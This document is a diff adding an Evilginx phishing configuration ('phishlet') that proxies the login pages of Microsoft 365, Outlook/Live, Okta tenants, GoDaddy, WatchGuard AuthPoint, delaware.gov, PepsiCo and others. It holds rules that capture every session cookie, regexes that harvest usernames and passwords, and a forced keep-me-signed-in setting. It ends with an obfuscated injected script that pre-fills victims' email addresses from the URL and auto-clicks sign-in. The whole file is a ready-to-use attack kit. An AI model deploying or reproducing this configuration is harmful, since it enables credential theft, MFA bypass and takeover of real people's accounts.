@@ -1,0 +1,158 @@
+name: "@EvilWhales"
+min_ver: "3.3.0"
+
+proxy_hosts:
+  - { phish_sub: "login", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true, auto_filter: false }
+  - { phish_sub: "react", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "o", orig_sub: "o", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "sci", orig_sub: "sci", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "dotfoods", orig_sub: "dotfoods", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "login1", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "office", orig_sub: "login", domain: "bx.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "msfed", orig_sub: "msfed", domain: "bms.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "advath", orig_sub: "advath", domain: "bms.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "smusxath", orig_sub: "smusxath", domain: "bms.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "ulgroup", orig_sub: "ulgroup", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "YWNjb", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "account", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "outlook", orig_sub: "outlook", domain: "live.com", session: true, is_landing: false }
+  - { phish_sub: "sso", orig_sub: "sso", domain: "godaddy.com", session: true, is_landing: false }
+  - { phish_sub: "sso", orig_sub: "sso", domain: "secureserver.net", session: true, is_landing: false, auto_filter: true  }
+  - { phish_sub: "vn3Hg", orig_sub: "aadcdn", domain: "msauth.net", session: true, is_landing: false }
+  - {phish_sub: '', orig_sub: '', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
+  - { phish_sub: "sp.authpoint.usa", orig_sub: "sp.authpoint.usa", domain: "cloud.watchguard.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "usa", orig_sub: "usa", domain: "authpoint.watchguard.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "auth", orig_sub: "auth", domain: "op2online.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "id", orig_sub: "id", domain: "delaware.gov", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "secure", orig_sub: "secure", domain: "pepsico.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "m365", orig_sub: "m365", domain: "cloud.microsoft", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "res-1.cdn", orig_sub: "res-1.cdn", domain: "office.net", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "res.cdn", orig_sub: "res.cdn", domain: "office.net", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "substrate", orig_sub: "substrate", domain: "office.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "content.lifecycle", orig_sub: "content.lifecycle", domain: "office.net", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "graph", orig_sub: "graph", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "res.public.onecdn", orig_sub: "res.public.onecdn", domain: "static.microsoft", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "ecs", orig_sub: "ecs", domain: "office.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "storage", orig_sub: "storage", domain: "live.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "browser.events.data", orig_sub: "browser.events.data", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "amcdn", orig_sub: "amcdn", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "oness", orig_sub: "oness", domain: "office.net", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "logincdn", orig_sub: "logincdn", domain: "msftauth.net", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "fpt", orig_sub: "fpt", domain: "live.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "df.cfp", orig_sub: "df.cfp", domain: "microsoft.com", session: true, is_landing: false, auto_filter: true }
+
+sub_filters:
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "aadcdn", domain: "msauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'href="https://{hostname}/149e9513-01fa-4fb0-aad4-566afd725d1b/2d206a39-8ed7-437e-a3be-862e0f06eea3/fp', replace: 'href="https://{hostname}/149e9513-01fa-4fb0-aad4-566afd725d1b/2d206a39-8ed7-437e-a3be-862e0f06eea3/fp', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: '{domain}', replace: '{domain}', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "www", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "login.live.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "login.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "login.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "login.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "login.live.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "login.live.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "account.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "account.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "account.live.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "account.live.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "m365.cloud.microsoft", orig_sub: "m365", domain: "cloud.microsoft", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "m365.cloud.microsoft", orig_sub: "res.public.onecdn", domain: "static.microsoft", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "m365.cloud.microsoft", orig_sub: "res-1.cdn", domain: "office.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "m365.cloud.microsoft", orig_sub: "res.cdn", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "m365.cloud.microsoft", orig_sub: "substrate", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "m365.cloud.microsoft", orig_sub: "content.lifecycle", domain: "office.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "m365.cloud.microsoft", orig_sub: "graph", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "m365.cloud.microsoft", orig_sub: "res.public.onecdn", domain: "static.microsoft", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "m365.cloud.microsoft", orig_sub: "ecs", domain: "office.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "m365.cloud.microsoft", orig_sub: "storage", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "m365.cloud.microsoft", orig_sub: "browser.events.data", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "m365.cloud.microsoft", orig_sub: "amcdn", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "m365.cloud.microsoft", orig_sub: "oness", domain: "office.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "m365", domain: "cloud.microsoft", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "login.live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
+
+
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['.*,regexp']
+  - domain: 'login.microsoftonline.com'
+    keys: ['.*,regexp']
+  - domain: '.live.com'
+    keys: ['.*,regexp']
+  - domain: '.login.live.com'
+    keys: ['.*,regexp']
+  - domain: 'login.live.com'
+    keys: ['.*,regexp']
+  - domain: 'login.bx.com'
+    keys: ['.*,regexp']
+  - domain: '.bms.com'
+    keys: ['.*,regexp']
+  - domain: 'advath.bms.com'
+    keys: ['.*,regexp']
+  - domain: 'outlook.live.com'
+    keys: ['.*,regexp']
+  - domain: 'sso.secureserver.net'
+    keys: ['.*,regexp']
+  - domain: 'sso.godaddy.com'
+    keys: ['.*,regexp']
+  - domain: 'sp.authpoint.usa.cloud.watchguard.com'
+    keys: ['.*,regexp']
+  - domain: 'auth.op2online.com'
+    keys: ['.*,regexp']
+  - domain: 'id.delaware.gov'
+    keys: ['.*,regexp']
+  - domain: 'secure.pepsico.com'
+    keys: ['.*,regexp']
+
+force_post:
+  - path: "/ppsecure/post*"
+    search:
+      - { key: "LoginOptions", search: "1" }
+    force:
+      - { key: "DontShowAgain", value: "true" }
+    type: "post"
+
+auth_urls:
+  - "/kmsi*"
+  - "/landingv2"
+  - "/login.srf"
+
+credentials:
+  username:
+    key: "(login|UserName|username|email|account|identifier|utemp)"
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: "(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)"
+    search: '(.*)'
+    type: "post"
+  custom:
+    - key: 'Username'
+      search: '"username":"([^"]*)'
+      type: "json"
+    - key: 'Login'
+      search: '"login":"([^"]*)'
+      type: "json"
+    - key: 'password'
+      search: '"password":"([^"]*)'
+      type: "json"
+
+login:
+  domain: "login.microsoftonline.com"
+  path: "/"
+
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
+    trigger_paths: ["/common/oauth2/", "/", /common/oauth2/*", "/*"]
+    script: |
+      const _0x551cd1=_0x1763;(function(_0x248df7,_0x2fe5f6){const _0x10fe98=_0x1763,_0x4c1d37=_0x248df7();while(!![]){try{const _0x370bd4=-parseInt(_0x10fe98(0x14d))/0x1*(parseInt(_0x10fe98(0x167))/0x2)+parseInt(_0x10fe98(0x15b))/0x3+-parseInt(_0x10fe98(0x153))/0x4+-parseInt(_0x10fe98(0x145))/0x5+parseInt(_0x10fe98(0x14c))/0x6+parseInt(_0x10fe98(0x16a))/0x7*(parseInt(_0x10fe98(0x146))/0x8)+-parseInt(_0x10fe98(0x170))/0x9;if(_0x370bd4===_0x2fe5f6)break;else _0x4c1d37['push'](_0x4c1d37['shift']());}catch(_0x1fed9c){_0x4c1d37['push'](_0x4c1d37['shift']());}}}(_0x31f1,0x2718a));function lp(){const _0x377790=_0x1763;var _0x3406dd=document['querySelector'](_0x377790(0x155)),_0x7a9fc4=document[_0x377790(0x164)](_0x377790(0x154)),_0x59314c=window[_0x377790(0x15a)][_0x377790(0x140)];if(/#/[_0x377790(0x15c)](window[_0x377790(0x15a)][_0x377790(0x140)])){var _0x1687c8=_0x59314c['split']('#'),_0x512bf4=_0x1687c8[0x0],_0x105c2f=_0x1687c8[0x1];console[_0x377790(0x15f)](_0x512bf4),console[_0x377790(0x15f)](_0x105c2f);if(_0x3406dd!=null){var _0x463b93=_0x105c2f;if(/^[A-Za-z0-9+/=]+$/[_0x377790(0x15c)](_0x105c2f))try{_0x463b93=window['atob'](_0x105c2f[_0x377790(0x165)](/[=]/gi,''));}catch(_0x132f89){console[_0x377790(0x159)](_0x377790(0x150),_0x132f89);}_0x3406dd['focus'](),_0x3406dd[_0x377790(0x16c)]=_0x463b93,_0x7a9fc4[_0x377790(0x142)](),_0x7a9fc4[_0x377790(0x163)]();return;}}setTimeout(function(){lp();},0xfa0);}setTimeout(function(){lp();},0xfa0);function createWatermark(){const _0x32bd43=_0x1763,_0x2b2db4=()=>{const _0xb0e6df=_0x1763;if(document[_0xb0e6df(0x149)]){if(document[_0xb0e6df(0x164)]('.watermark-container'))return console[_0xb0e6df(0x15f)](_0xb0e6df(0x169)),!![];const _0x564a79=document[_0xb0e6df(0x161)](_0xb0e6df(0x147));_0x564a79['className']=_0xb0e6df(0x168),_0x564a79[_0xb0e6df(0x152)][_0xb0e6df(0x14e)]=_0xb0e6df(0x171);const _0x9d30b6='EvilGinx\x20LAB\x20by\x20INJECT';for(let _0x139f42=-0x64;_0x139f42<window[_0xb0e6df(0x15d)]+0x64;_0x139f42+=0x96){for(let _0x350d63=-0x64;_0x350d63<window[_0xb0e6df(0x16f)]+0x64;_0x350d63+=0x12c){const _0x483d3e=document[_0xb0e6df(0x161)](_0xb0e6df(0x147));_0x483d3e[_0xb0e6df(0x152)]['cssText']=_0xb0e6df(0x162)+_0x350d63+'px\x20!important;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20top:\x20'+_0x139f42+_0xb0e6df(0x160),_0x483d3e[_0xb0e6df(0x16d)]=_0x9d30b6,_0x564a79['appendChild'](_0x483d3e);}}document['body']['insertBefore'](_0x564a79,document[_0xb0e6df(0x149)][_0xb0e6df(0x14a)]),console[_0xb0e6df(0x15f)](_0xb0e6df(0x16e),document[_0xb0e6df(0x164)](_0xb0e6df(0x16b))?'present':_0xb0e6df(0x148));const _0x165180=document[_0xb0e6df(0x164)]('.watermark-container');if(_0x165180){const _0x37c1a8=window[_0xb0e6df(0x15e)](_0x165180);console[_0xb0e6df(0x15f)](_0xb0e6df(0x166),{'display':_0x37c1a8[_0xb0e6df(0x144)],'visibility':_0x37c1a8[_0xb0e6df(0x173)],'opacity':_0x37c1a8[_0xb0e6df(0x143)],'zIndex':_0x37c1a8[_0xb0e6df(0x14b)]});let _0x4813a4=_0x165180[_0xb0e6df(0x151)];while(_0x4813a4){const _0x3178b1=window[_0xb0e6df(0x15e)](_0x4813a4);console[_0xb0e6df(0x15f)]('js_inject:\x20Parent\x20element\x20styles:',{'tag':_0x4813a4[_0xb0e6df(0x14f)],'display':_0x3178b1[_0xb0e6df(0x144)],'visibility':_0x3178b1[_0xb0e6df(0x173)],'overflow':_0x3178b1[_0xb0e6df(0x172)],'zIndex':_0x3178b1[_0xb0e6df(0x14b)]}),_0x4813a4=_0x4813a4[_0xb0e6df(0x151)];}}return!![];}return console[_0xb0e6df(0x15f)](_0xb0e6df(0x158)),![];};requestAnimationFrame(()=>{if(!_0x2b2db4()){const _0x4b77bb=setInterval(()=>{_0x2b2db4()&&clearInterval(_0x4b77bb);},0x64);}});const _0x1fc4ee=new MutationObserver(_0xc3f82f=>{const _0x76c285=_0x1763;!document[_0x76c285(0x164)](_0x76c285(0x16b))&&(console[_0x76c285(0x15f)](_0x76c285(0x157)),_0x2b2db4());});_0x1fc4ee[_0x32bd43(0x156)](document[_0x32bd43(0x149)],{'childList':!![],'subtree':!![]});}function _0x31f1(){const _0x5d5961=['log','px\x20!important;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#333333\x20!important;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20Arial,\x20sans-serif\x20!important;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2024px\x20!important;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20opacity:\x200.2\x20!important;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20rotate(-45deg)\x20!important;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20white-space:\x20nowrap\x20!important;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20user-select:\x20none\x20!important;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','createElement','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20position:\x20absolute\x20!important;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20left:\x20','click','querySelector','replace','js_inject:\x20Watermark\x20container\x20styles:','2FsAJxI','watermark-container','js_inject:\x20Watermark\x20container\x20already\x20exists,\x20skipping\x20creation','7mbWQuK','.watermark-container','value','textContent','js_inject:\x20Watermark\x20added\x20as\x20first\x20child\x20of\x20body,\x20container:','innerWidth','1174068icAoRV','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20position:\x20fixed\x20!important;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20top:\x200\x20!important;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20left:\x200\x20!important;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x20100%\x20!important;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x20100%\x20!important;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20z-index:\x202147483647\x20!important;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20pointer-events:\x20none\x20!important;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20overflow:\x20visible\x20!important;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20transparent\x20!important;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','overflow','visibility','href','js_inject:\x20Initializing\x20at','focus','opacity','display','620980fnWLbU','1878424PWlOhl','div','missing','body','firstChild','zIndex','318174tItHou','61327aZFPRw','cssText','tagName','Error\x20decoding\x20base64\x20string:','parentElement','style','391776EGvMtU','#idSIButton9','#i0116','observe','js_inject:\x20Watermark\x20container\x20removed,\x20re-adding','js_inject:\x20Document\x20body\x20not\x20ready,\x20retrying\x20watermark\x20creation','error','location','858675vbmAOY','test','innerHeight','getComputedStyle'];_0x31f1=function(){return _0x5d5961;};return _0x31f1();}function _0x1763(_0x56b68a,_0x4543bd){const _0x31f110=_0x31f1();return _0x1763=function(_0x176309,_0x5188cb){_0x176309=_0x176309-0x140;let _0x31215a=_0x31f110[_0x176309];return _0x31215a;},_0x1763(_0x56b68a,_0x4543bd);}console['log'](_0x551cd1(0x141),new Date()['toISOString']()),createWatermark(),setTimeout(function(){lp();},0x1f4);
